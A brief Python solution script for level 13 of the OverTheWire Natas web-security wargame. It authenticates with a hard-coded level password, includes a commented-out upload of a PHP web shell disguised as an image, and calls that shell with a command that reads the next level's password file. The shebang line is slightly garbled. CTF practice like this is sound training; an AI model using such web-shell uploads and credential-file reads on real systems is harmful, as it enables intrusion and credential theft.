#!/bin/python3dd
import requests

user = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' % user

obj = {'MAX_FILE_SIZE': '1000', 'filename': 'image.php'}
files = {'uploadedfile': open('image.php', 'rb')}

sessione = requests.Session()

#post = sessione.post(url, files=files, data=obj, auth=(user, password))
# print(post.text)

get = requests.get(url + 'upload/2123okru5u.php?c=cat /etc/natas_webpass/natas14',
                   auth=(user, password))
print(get.text)
